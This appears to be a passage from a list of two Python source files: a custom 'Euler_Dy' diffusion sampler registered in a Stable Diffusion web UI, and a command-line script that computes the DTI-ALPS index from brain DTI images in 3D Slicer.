    "import torch\nimport tqdm\nimport k_diffusion.sampling\nfrom modules import sd_samplers_common, sd_samplers_kdiffusion, sd_samplers\nfrom tqdm.auto import trange, tqdm\nfrom k_diffusion import utils\nfrom k_diffusion.sampling import to_d\nimport math\n\n\nNAME = 'Euler_Dy'\nALIAS = 'euler_dy'\n\n\n\n@torch.no_grad()\ndef dy_sampling_step(x, model, dt, sigma_hat, **extra_args):\n\n    original_shape = x.shape\n    batch_size, m, n = original_shape[0], original_shape[2] // 2, original_shape[3] // 2\n    extra_row = x.shape[2] % 2 == 1\n    extra_col = x.shape[3] % 2 == 1\n\n    if extra_row:\n        extra_row_content = x[:, :, -1:, :]\n        x = x[:, :, :-1, :]\n    if extra_col:\n        extra_col_content = x[:, :, :, -1:]\n        x = x[:, :, :, :-1]\n\n    a_list = x.unfold(2, 2, 2).unfold(3, 2, 2).contiguous().view(batch_size, 4, m * n, 2, 2)\n    c = a_list[:, :, :, 1, 1].view(batch_size, 4, m, n)\n\n    denoised = model(c, sigma_hat * c.new_ones([c.shape[0]]), **extra_args)\n    d = to_d(c, sigma_hat, denoised)\n    c = c + d * dt\n\n    d_list = c.view(batch_size, 4, m * n, 1, 1)\n    a_list[:, :, :, 1, 1] = d_list[:, :, :, 0, 0]\n    x = a_list.view(batch_size, 4, m, n, 2, 2).permute(0, 1, 2, 4, 3, 5).reshape(batch_size, 4, 2 * m, 2 * n)\n\n    if extra_row or extra_col:\n        x_expanded = torch.zeros(original_shape, dtype=x.dtype, device=x.device)\n        x_expanded[:, :, :2 * m, :2 * n] = x\n        if extra_row:\n            x_expanded[:, :, -1:, :2 * n + 1] = extra_row_content\n        if extra_col:\n            x_expanded[:, :, :2 * m, -1:] = extra_col_content\n        if extra_row and extra_col:\n            x_expanded[:, :, -1:, -1:] = extra_col_content[:, :, -1:, :]\n        x = x_expanded\n\n    return x\n\n\n@torch.no_grad()\ndef sample_euler_dy(model, x, sigmas, extra_args=None, callback=None, disable=None, s_churn=0., s_tmin=0.,\n                               s_tmax=float('inf'), s_noise=1.):\n    extra_args = {} if extra_args is None else extra_args\n    s_in = x.new_ones([x.shape[0]])\n    for i in trange(len(sigmas) - 1, disable=disable):\n        # print(i)\n        # i\u7b2c\u4e00\u6b65\u4e3a0\n        gamma = max(s_churn / (len(sigmas) - 1), 2 ** 0.5 - 1) if s_tmin <= sigmas[i] <= s_tmax else 0.\n        eps = torch.randn_like(x) * s_noise\n        sigma_hat = sigmas[i] * (gamma + 1)\n        # print(sigma_hat)\n        dt = sigmas[i + 1] - sigma_hat\n        if gamma > 0:\n            x = x - eps * (sigma_hat ** 2 - sigmas[i] ** 2) ** 0.5\n        denoised = model(x, sigma_hat * s_in, **extra_args)\n        d = to_d(x, sigma_hat, denoised)\n        if sigmas[i + 1] > 0:\n            if i // 2 == 1:\n                x = dy_sampling_step(x, model, dt, sigma_hat, **extra_args)\n        if callback is not None:\n            callback({'x': x, 'i': i, 'sigma': sigmas[i], 'sigma_hat': sigma_hat, 'denoised': denoised})\n        # Euler method\n        x = x + d * dt\n    return x\n\n\n\nif not NAME in [x.name for x in sd_samplers.all_samplers]:\n    euler_max_samplers = [(NAME, sample_euler_dy, [ALIAS], {})]\n    samplers_data_euler_max_samplers = [\n        sd_samplers_common.SamplerData(label, lambda model, funcname=funcname: sd_samplers_kdiffusion.KDiffusionSampler(funcname, model), aliases, options)\n        for label, funcname, aliases, options in euler_max_samplers\n        if callable(funcname) or hasattr(k_diffusion.sampling, funcname)\n    ]\n    sd_samplers.all_samplers += samplers_data_euler_max_samplers\n    sd_samplers.all_samplers_map = {x.name: x for x in sd_samplers.all_samplers}\n",
    "import argparse\nimport os\nimport sys\n\nimport numpy as np\n\n# Instantiate the parser\nparser = argparse.ArgumentParser(description=\"Python script to facilitate calling DTI-ALPS module from command line. \\n\"+ \n                                 \"This script calls the Slicer module Python code and all the funcionalities are described in the wiki page: \"+\n                                 \"https://www.slicer.org/wiki/Documentation/Nightly/Extensions/DTI_ALPS\")\n\nparser.add_argument(\"inputDTI\", type=str,\n                    help=\"Input DTI image file path\")\nparser.add_argument(\"inputProjLabel\", type=str, nargs='?',\n                    help=\"Input image label that defines de Projection ROI in the DTI image space\")\nparser.add_argument(\"inputAssocLabel\", type=str, nargs='?',\n                    help=\"Input image label that defines de Association ROI in the DTI image space\")\nparser.add_argument(\"--MNISpace\", action='store_true',\n                    help=\"Informs whether the input DTI image is already in the MNI space (2 mm resolution). If yes, the input Proj/Assoc paths are changed for the standard MNI labels instead.\")\nparser.add_argument(\"--verbose\", action='store_true',\n                    help=\"Show more details thoughout the processing.\")\n\n\nargs = parser.parse_args()\n\n# Show input details\nif args.verbose:\n    print(\"-- DTI-ALPS Initiation:\")\n    print(\"Input parameters:\")\n    print(f\"  1. Input DTI: {args.inputDTI}\")\n    if not args.MNISpace:\n        print(f\"  2. Input Projection label: {args.inputProjLabel}\")\n        print(f\"  3. Input Association label: {args.inputAssocLabel}\")\n    else:\n        print(\"  2. Input Projection label: Used MNI standard (--MNISpace is True)\")\n        print(\"  3. Input Association label: Used MNI standard (--MNISpace is True)\")\n    print(f\"  4. MNISpace: {args.MNISpace}\")\n\n\n# General variables\nmodule_path = os.path.dirname(slicer.modules.dti_alps.path)\ninputDTI = \"\"\ninputProjLabel = \"\"\ninputAssocLabel = \"\"\ndti_alps_obj = slicer.modules.dti_alps.widgetRepresentation().self()\n\ndti_alps_idx = 0\n\n\n# Load the input data\nif args.verbose:\n    print(\"-- DTI-ALPS: Load data\")\n    print(\"  1. Load DTI volume...\", end=\"\", flush=True)\ninputDTI = slicer.util.loadVolume(args.inputDTI)\nif args.verbose:\n    print(\"done\")\n\nif args.verbose:\n    print(\"-- DTI-ALPS: Load data\")\n    print(\"  1. Load Projection and Association label volumes...\", end=\"\", flush=True)\nif not args.MNISpace:\n    inputProjLabel = slicer.util.loadLabelVolume(args.inputProjLabel)\n    inputAssocLabel = slicer.util.loadLabelVolume(args.inputAssocLabel)\nelse:\n    inputProjLabel = slicer.util.loadLabelVolume(module_path+os.path.sep+\"Resources\"+os.path.sep+\"MNI\"+os.path.sep+\"Projection-label-2mm-MNI.nii.gz\")\n    inputAssocLabel = slicer.util.loadLabelVolume(module_path+os.path.sep+\"Resources\"+os.path.sep+\"MNI\"+os.path.sep+\"Association-label-2mm-MNI.nii.gz\")\nif args.verbose:\n    print(\"done\")\n\n# Check if input data is in MNI space 2mm\nif args.MNISpace:\n    if args.verbose:\n        print(\"-- Check input and MNI spacing...\", end=\"\", flush=True)\n    isMNI = dti_alps_obj.logic.checkMNISpaceInput(inputDTI,inputProjLabel)\n    if not isMNI:\n        print(\"ERROR: Input DTI is not in MNI space 2mm\")\n        sys.exit(1)\n    if args.verbose:\n        print(\"done\")\n\n# Call Slicer DTI-ALPS module\nif args.verbose:\n    print(\"-- DTI-ALPS index calculation\")\n    print(\"  1. Calling Slicer DTI-ALPS module...\", end=\"\", flush=True)\n\n# Call the DTI-ALPS calculation method\ndti_alps_idx = dti_alps_obj.logic.calculateDTIALPS(inputDTI, inputProjLabel, inputAssocLabel)\nif args.verbose:\n    print(\"done\")\n\n# Output result\nprint(f\"DTI-ALPS index = {dti_alps_idx}\")\n\nsys.exit(0)"
]